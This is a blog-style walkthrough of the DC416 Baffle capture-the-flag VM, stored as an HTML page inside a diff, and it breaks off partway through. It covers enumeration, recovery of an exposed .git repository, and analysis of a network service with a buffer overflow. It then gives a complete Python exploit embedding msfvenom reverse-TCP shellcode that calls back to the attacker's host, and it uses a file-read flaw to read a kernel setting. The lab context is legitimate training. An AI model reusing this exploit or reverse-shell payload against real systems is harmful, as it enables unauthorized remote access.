@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      DC416 Baffle Walkthrough &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li>
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2017-01-07 00:00:00 -0600">January 07, 2017</time>
+    
+  </div>
+
+  <h1 class="post-title">DC416 Baffle Walkthrough</h1>
+  <div class="post-line"></div>
+
+  <p>This is one of the harder VM’s I’ve worked on in a while and it taught me many new skills! Good job putting this one together vulnhub CTF team!</p>
+
+<h2 id="start">START!</h2>
+
+<p>First, some basic enumeration. Found a .git directory on the site that looked interesting so I downloaded it’s contents and took a look at the diffs. I’ve cut a good portion of the output below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>400 <span class="nt">-T4</span> 192.168.1.69
+
+Starting Nmap 7.25BETA2 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2016-12-10 08:42 EST
+Nmap scan report <span class="k">for </span>baffle <span class="o">(</span>192.168.1.69<span class="o">)</span>
+Host is up <span class="o">(</span>0.0013s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6969/tcp open  acmsoda
+MAC Address: 00:0C:29:D3:61:63 <span class="o">(</span>VMware<span class="o">)</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>4.53 seconds
+root@kali:~#
+root@kali:~#
+root@kali:~# curl <span class="nt">-s</span> http://192.168.1.69
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span> /&gt;
+&lt;title&gt;baffle&lt;/title&gt;
+&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"styles.css"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span> /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
+
+&lt;h1&gt;DC416 : baffle&lt;/h1&gt;
+&lt;h3&gt;Engagement Rules:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;No username/password bruteforcing is necessary&lt;/li&gt;
+&lt;li&gt;This box has &lt;b&gt;5&lt;/b&gt; flags&lt;/li&gt;
+&lt;li&gt;Flags are <span class="k">in</span> &lt;b&gt;FLAG<span class="o">{}</span>&lt;/b&gt; format&lt;/li&gt;
+&lt;li&gt;The goal is &lt;b&gt;not&lt;/b&gt; to get root. Get the flags and move on&lt;/li&gt;
+&lt;li&gt;Have fun&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;img <span class="nv">class</span><span class="o">=</span><span class="s2">"logo"</span> <span class="nv">src</span><span class="o">=</span><span class="s2">"logo.png"</span><span class="o">&gt;</span>
+
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+root@kali:~#
+root@kali:~# dirb http://192.168.1.69
+
+<span class="nt">-----------------</span>
+DIRB v2.22    
+By The Dark Raver
+<span class="nt">-----------------</span>
+
+START_TIME: Sat Dec 10 08:43:19 2016
+URL_BASE: http://192.168.1.69/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+<span class="nt">-----------------</span>
+
+GENERATED WORDS: 4612                                                          
+
+<span class="nt">----</span> Scanning URL: http://192.168.1.69/ <span class="nt">----</span>
++ http://192.168.1.69/.git/HEAD <span class="o">(</span>CODE:200|SIZE:23<span class="o">)</span>                                                                                   
+
+<span class="nt">-----------------</span>
+END_TIME: Sat Dec 10 08:43:26 2016
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~#
+root@kali:/tmp/baffle/192.168.1.69# wget <span class="nt">-r</span> <span class="nt">-np</span> <span class="nt">-k</span> http://192.168.1.69/.git/objects/
+<span class="nt">--2016-12-10</span> 09:29:06--  http://192.168.1.69/.git/objects/
+Connecting to 192.168.1.69:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified <span class="o">[</span>text/html]
+Saving to: ë192.168.1.69/.git/objects/index.htmlí
+
+192.168.1.69/.git/objects/index.h     <span class="o">[</span> &lt;<span class="o">=&gt;</span>                                                        <span class="o">]</span>   2.29K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+...SNIP...
+
+192.168.1.69/.git/objects/e2/0f9a 100%[<span class="o">===========================================================&gt;]</span>      57  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2016-12-10 09:29:06 <span class="o">(</span>2.87 MB/s<span class="o">)</span> - ë192.168.1.69/.git/objects/e2/0f9a337b6577af20e1d9d2d328d86536bd5086í saved <span class="o">[</span>57/57]
+
+FINISHED <span class="nt">--2016-12-10</span> 09:29:06--
+Total wall clock <span class="nb">time</span>: 0.2s
+Downloaded: 40 files, 16K <span class="k">in </span>0.001s <span class="o">(</span>14.5 MB/s<span class="o">)</span>
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/06/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/pack/index.html... 1-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/7e/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/d7/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/d5/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/d1/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/9b/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/10/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/8b/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/7f/index.html... 3-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/index.html... 20-1
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/6f/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/21/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/ac/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/91/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/c2/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/e2/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/32/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/info/index.html... 1-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/2f/index.html... 2-0
+Converting links <span class="k">in </span>192.168.1.69/.git/objects/d3/index.html... 2-0
+Converted links <span class="k">in </span>21 files <span class="k">in </span>0.04 seconds.
+
+root@kali:/tmp# git clone 192.168.1.69/.git baffle
+Cloning into <span class="s1">'baffle'</span>...
+<span class="k">done</span><span class="nb">.</span>
+root@kali:/tmp# <span class="nb">cd </span>baffle/
+root@kali:/tmp/baffle# <span class="nb">ls</span> <span class="nt">-al</span>
+total 16
+drwxr-xr-x  3 root root 4096 Dec 11 07:31 <span class="nb">.</span>
+drwxrwxrwt 14 root root 4096 Dec 11 07:31 ..
+drwxr-xr-x  8 root root 4096 Dec 11 07:31 .git
+<span class="nt">-rw-r--r--</span>  1 root root  616 Dec 11 07:31 hellofriend.c
+
+…SNIP…
+
+commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+Author: alice &lt;alice@baffle.me&gt;
+Date:   Mon Oct 17 14:55:07 2016 <span class="nt">-0400</span>
+
+    Some assembly required
+
+diff <span class="nt">--git</span> a/project.enc b/project.enc
+new file mode 100644
+index 0000000..7fe355b
+<span class="nt">---</span> /dev/null
++++ b/project.enc
+@@ <span class="nt">-0</span>,0 +1,147 @@
++f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAUAZAAAAAAABAAAAAAAAAAPgYAAAAAAAAAAAAAEAAOAAI
++AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAwAEAAAAAAADAAQAAAAAAAAgA
++AAAAAAAAAwAAAAQAAAAAAgAAAAAAAAACQAAAAAAAAAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
++AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAFwLAAAAAAAAXAsAAAAAAAAAACAA
++AAAAAAEAAAAGAAAAYAsAAAAAAABgC2AAAAAAAGALYAAAAAAAYAIAAAAAAAB4BAAAAAAAAAAAIAAA
++AAAAAgAAAAYAAAB4CwAAAAAAAHgLYAAAAAAAeAtgAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA
++AAAEAAAABAAAABwCAAAAAAAAHAJAAAAAAAAcAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
+&lt;Many more lines here&gt;
+…SNIP…
+</code></pre></div></div>
+
+<p>Looks like we some interesting code to work with. One I’m particularly interested in is commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca. I checked out the commit and recreated the binary from it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+
+…SNIP…
+
+HEAD is now at d38ce2e... Some assembly required
+root@kali:/mnt/hgfs/kali64/baffle# <span class="nb">ls</span> <span class="nt">-al</span>
+total 15
+drwxr-xr-x 1 501 dialout   136 Jan  2  2017 <span class="nb">.</span>
+drwxr-xr-x 1 501 dialout   544 Jan  2  2017 ..
+drwxr-xr-x 1 501 dialout   442 Jan  2  2017 .git
+<span class="nt">-rw-r--r--</span> 1 501 dialout   857 Jan  2  2017 hellofriend.c
+<span class="nt">-rw-r--r--</span> 1 501 dialout 11315 Jan  2  2017 project.enc
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# <span class="nb">cat </span>project.enc | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> project
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# file project
+project: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>8d8f87535451003b05db15d14d07818576813b49, not stripped
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# <span class="nb">chmod</span> +x project
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# ./project
+<span class="nb">test
+</span>root@kali:/mnt/hgfs/kali64/baffle#
+</code></pre></div></div>
+
+<p>So we have something, so let’s see what’s going on.</p>
+
+<p>We can see a couple of compares in the disassembled code.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|          0x004007af    837df401       cmp dword <span class="o">[</span>rbp-local_1_4], 1    <span class="p">;</span> <span class="o">[</span>0x1:4]<span class="o">=</span>0x2464c45
+|      ,<span class="o">=</span>&lt; 0x004007b3    0f8596000000   jne 0x40084f      
+
+...SNIP...
+
+|     <span class="sb">``</span>-&gt; 0x0040084f    837df402       cmp dword <span class="o">[</span>rbp-local_1_4], 2    <span class="p">;</span> <span class="o">[</span>0x2:4]<span class="o">=</span>0x102464c
+|    ,<span class="o">===</span>&lt; 0x00400853    0f8597000000   jne 0x4008f0   
+</code></pre></div></div>
+
+<p>When we execute it through ltrace we can see some interesting things. First sending in 0x02 and flag.txt gives us a seg fault, sending in 0x01 and flag.txt seems to be cutting off our flag.txt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/baffle# python <span class="nt">-c</span><span class="s1">'print "\x01"*2 + "flag.txt"'</span> | ltrace ./project
+__libc_start_main<span class="o">(</span>0x4008f7, 1, 0x7fffb82dc7b8, 0x400980 &lt;unfinished ...&gt;
+setbuf<span class="o">(</span>0x7f7d937ea620, 0<span class="o">)</span>                                                                                                                                                      <span class="o">=</span> &lt;void&gt;
+memset<span class="o">(</span>0x7fffb82dbef0, <span class="s1">'\0'</span>, 2000<span class="o">)</span>                                                                                                                                             <span class="o">=</span> 0x7fffb82dbef0
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\0</span><span class="s2">01</span><span class="se">\0</span><span class="s2">01flag.txt</span><span class="se">\n</span><span class="s2">"</span>, 2000<span class="o">)</span>                                                                                                                                            <span class="o">=</span> 11
+memset<span class="o">(</span>0x7fffb82dbac0, <span class="s1">'\0'</span>, 500<span class="o">)</span>                                                                                                                                              <span class="o">=</span> 0x7fffb82dbac0
+memset<span class="o">(</span>0x7fffb82db8b0, <span class="s1">'\0'</span>, 10<span class="o">)</span>                                                                                                                                               <span class="o">=</span> 0x7fffb82db8b0
+memcpy<span class="o">(</span>0x7fffb82dbac0, <span class="s2">"fl"</span>, 2<span class="o">)</span>                                                                                                                                                <span class="o">=</span> 0x7fffb82dbac0
+fopen<span class="o">(</span><span class="s2">"fl"</span>, <span class="s2">"r"</span><span class="o">)</span>                                                                                                                                                               <span class="o">=</span> 0
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# python <span class="nt">-c</span><span class="s1">'print "\x02"*2 + "flag.txt"'</span> | ltrace ./project
+__libc_start_main<span class="o">(</span>0x4008f7, 1, 0x7fffbc7315a8, 0x400980 &lt;unfinished ...&gt;
+setbuf<span class="o">(</span>0x7f6c6ccb3620, 0<span class="o">)</span>                                                                                                                                                      <span class="o">=</span> &lt;void&gt;
+memset<span class="o">(</span>0x7fffbc730ce0, <span class="s1">'\0'</span>, 2000<span class="o">)</span>                                                                                                                                             <span class="o">=</span> 0x7fffbc730ce0
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\0</span><span class="s2">02</span><span class="se">\0</span><span class="s2">02flag.txt</span><span class="se">\n</span><span class="s2">"</span>, 2000<span class="o">)</span>                                                                                                                                            <span class="o">=</span> 11
+memset<span class="o">(</span>0x7fffbc7308b0, <span class="s1">'\0'</span>, 500<span class="o">)</span>                                                                                                                                              <span class="o">=</span> 0x7fffbc7308b0
+memset<span class="o">(</span>0x7fffbc7306a0, <span class="s1">'\0'</span>, 10<span class="o">)</span>                                                                                                                                               <span class="o">=</span> 0x7fffbc7306a0
+memset<span class="o">(</span>0x7fffbc730ab0, <span class="s1">'\0'</span>, 500<span class="o">)</span>                                                                                                                                              <span class="o">=</span> 0x7fffbc730ab0
+memset<span class="o">(</span>0x600de0, <span class="s1">'\0'</span>, 500<span class="o">)</span>                                                                                                                                                    <span class="o">=</span> 0x600de0
+strlen<span class="o">(</span><span class="s2">"flag.txt</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>                                                                                                                                                           <span class="o">=</span> 9
+memcpy<span class="o">(</span>0x7fffbc730ab0, <span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span class="s2">"</span>..., 2000<span class="o">)</span>                                                                            <span class="o">=</span> 0x7fffbc730ab0
+<span class="nt">---</span> SIGSEGV <span class="o">(</span>Segmentation fault<span class="o">)</span> <span class="nt">---</span>
++++ killed by SIGSEGV +++
+</code></pre></div></div>
+
+<p>0x01 was easy enough to get around, I just had to pad flag.txt with some extra spaces.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/baffle# python <span class="nt">-c</span><span class="s1">'print "\x01" * 2 + "flag.txt      "'</span> | nc 10.0.1.9 6969
+FLAG<span class="o">{</span>is_there_an_ivana_tinkle<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Awesome, we got ourselves our first (second, I’ll explain later) flag.</p>
+
+<p>I played around with this for some time. There is a buffer overflow when you send in 0x01 and 1032 bytes we are able to gain control of the return address, I couldn’t turn this into a shell though as we learn that ASLR is enabled on this host.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/baffle# python <span class="nt">-c</span><span class="s1">'print "\x01" * 2 + "/proc/sys/kernel/randomize_va_space      "'</span> | nc 10.0.1.9 6969
+2
+</code></pre></div></div>
+
+<p>I had to look for another method to get my shell. I noticed that sending in 0x02 would always result in a seg fault. The cause of this appears to be a memcpy() at the end that is writing 2000 bytes to a portion of the stack 528 bytes from the RBP. As you can see in the output below, the memcpy() is writing 2000 bytes to 0x7fffffffd8a0 which is 528 bytes from the RBP which is 0x7fffffffdab0.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>…SNIP…
+
+RBP: 0x7fffffffdab0 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffe2b0 <span class="nt">--</span><span class="o">&gt;</span> 0x400980 <span class="o">(</span>&lt;__libc_csu_init&gt;:	push   r15<span class="o">)</span>
+
+…SNIP…
+<span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+   0x4008e0 &lt;parse_request+410&gt;:	mov    edx,0x7d0
+   0x4008e5 &lt;parse_request+415&gt;:	mov    rsi,rcx
+   0x4008e8 &lt;parse_request+418&gt;:	mov    rdi,rax
+<span class="o">=&gt;</span> 0x4008eb &lt;parse_request+421&gt;:	call   0x400620 &lt;memcpy@plt&gt;
+   0x4008f0 &lt;parse_request+426&gt;:	mov    eax,0x0
+   0x4008f5 &lt;parse_request+431&gt;:	leave  
+   0x4008f6 &lt;parse_request+432&gt;:	ret    
+   0x4008f7 &lt;main&gt;:	push   rbp
+Guessed arguments:
+arg[0]: 0x7fffffffd8a0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+arg[1]: 0x7fffffffdae4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+arg[2]: 0x7d0
+arg[3]: 0x7fffffffdae4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+
+root@kali:/mnt/hgfs/kali64/baffle# python <span class="nt">-c</span><span class="s1">'print 0x7fffffffdab0 - 0x7fffffffd8a0'</span>
+528
+</code></pre></div></div>
+
+<p>So now we know that we can control the return address in RBP, I nailed down some exact numbers keeping in mind that we had to fill the entire 2000 bytes for memcpy.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span><span class="s1">'print "\x02\x02\x00" + "A" * 534 + "B" * 8 + "C" * 1464'</span> <span class="o">&gt;</span> input
+
+…SNIP…
+
+RAX: 0x0
+RBX: 0x0
+RCX: 0x7fffffffe040 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 39 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"</span><span class="se">\2</span><span class="s2">20</span><span class="se">\3</span><span class="s2">43</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">77</span><span class="se">\1</span><span class="s2">77"</span><span class="o">)</span>
+RDX: 0x7fffffffe040 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 39 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"</span><span class="se">\2</span><span class="s2">20</span><span class="se">\3</span><span class="s2">43</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">77</span><span class="se">\1</span><span class="s2">77"</span><span class="o">)</span>
+RSI: 0x7fffffffdaf9 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+RDI: 0x7fffffffd8a0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+RBP: 0x4242424242424242 <span class="o">(</span><span class="s1">'BBBBBBBB'</span><span class="o">)</span>
+RSP: 0x7fffffffdab8 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+RIP: 0x4008f6 <span class="o">(</span>&lt;parse_request+432&gt;:	ret<span class="o">)</span>
+R8 : 0x259
+R9 : 0x249
+R10: 0x239
+R11: 0x7ffff7ac5a10 <span class="o">(</span>&lt;__memcpy_sse2_unaligned&gt;:	mov    rax,rsi<span class="o">)</span>
+R12: 0x400650 <span class="o">(</span>&lt;_start&gt;:	xor    ebp,ebp<span class="o">)</span>
+R13: 0x7fffffffe390 <span class="nt">--</span><span class="o">&gt;</span> 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+   0x4008eb &lt;parse_request+421&gt;:	call   0x400620 &lt;memcpy@plt&gt;
+   0x4008f0 &lt;parse_request+426&gt;:	mov    eax,0x0
+   0x4008f5 &lt;parse_request+431&gt;:	leave  
+<span class="o">=&gt;</span> 0x4008f6 &lt;parse_request+432&gt;:	ret    
+   0x4008f7 &lt;main&gt;:	push   rbp
+   0x4008f8 &lt;main+1&gt;:	mov    rbp,rsp
+   0x4008fb &lt;main+4&gt;:	sub    rsp,0x7f0
+   0x400902 &lt;main+11&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x7e4],edi
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0x7fffffffdab8 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0008| 0x7fffffffdac0 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0016| 0x7fffffffdac8 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0024| 0x7fffffffdad0 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0032| 0x7fffffffdad8 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0040| 0x7fffffffdae0 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0048| 0x7fffffffdae8 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+0056| 0x7fffffffdaf0 <span class="o">(</span><span class="s1">'C'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+0x00000000004008f6 <span class="k">in </span>parse_request <span class="o">()</span>
+</code></pre></div></div>
+
+<p>The next challenge was to find out where to put our shellcode. Luckily, the binary tosses all of our data into a local variable named ‘to_write’ as you can see below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|    |     0x004008b0    bae00d6000     mov edx, sym.to_write          <span class="p">;</span> <span class="s2">"60802"</span> @ 0x600de0
+|    |     0x004008b5    b93e000000     mov ecx, 0x3e                  <span class="p">;</span> <span class="s1">'&gt;'</span>
+|    |     0x004008ba    4889d7         mov rdi, rdx
+|    |     0x004008bd    4889c6         mov rsi, rax
+|    |     0x004008c0    f348a5         rep movsq qword <span class="o">[</span>rdi], qword ptr <span class="o">[</span>rsi]
+</code></pre></div></div>
+
+<p>At this point it was rather simple. We just had to overwrite our return address with that of to_write and were golden.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="s">'''
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.60 LPORT=443 -b "</span><span class="se">\x00\x0a</span><span class="s">" -f python -v shellcode
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86_64 from the payload
+Found 2 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=42, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 111 (iteration=0)
+x64/xor chosen with final size 111
+Payload size: 111 bytes
+Final size of python file: 620 bytes
+'''</span>
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="s">""</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48\x8d</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x05\xef\xff\xff\xff\x48\xbb\x51\xe7\x72\x45\x85</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2e\x70\xc6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff\xe2\xf4\x19\xd6\x8d\x2f\x8c\x76\xe9\x70\x41</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xaf\xfb\x93\xc8\x1f\xb9\xac\x73\xa6\x28\xf7\x82</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x21\x75\x90\x01\x8d\x5b\x1d\x1c\x44\x72\x99\x3b</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xe6\x2c\x4a\x80\x66\xe7\x8e\xe8\xe5\x72\x44\x3e</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x24\x70\xc7\x59\xb6\x3a\xcc\x63\x44\x60\x9c\x3b</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcd\x2a\x4a\x80\x77\x2e\x9c\x5e\xe2\x8d\xa3\x85</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2e\x70\xc6</span><span class="s">"</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\x02\x02\x00</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">522</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x600de0</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">1450</span>
+
+<span class="k">print</span> <span class="n">buf</span>
+</code></pre></div></div>
+
+<p>Simple matter of setting up my multi/handler and piping the output to nc to get a shell as the Alice user.</p>
+
+<p>A bit of poking around and we find yet another binary named flag_vault in /home/bob/filez. This binary read a password from auth.txt to dump the contents of flag.txt. Local testing showed that it would seg fault if auth.txt and flag.txt weren’t available.</p>
+
+<p>Another hint in Alice’s inbox showed that the password for bob was in flag.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mail
+Mail version 8.1.2 01/15/2001.  Type ? <span class="k">for </span>help.
+<span class="s2">"/var/mail/alice"</span>: 1 message 1 new
+<span class="o">&gt;</span>N  1 bob@baffle.me      Thu Jan  2 11:38   21/559   Flag <span class="c">#2</span>
+&amp; 1
+1
+Message 1:
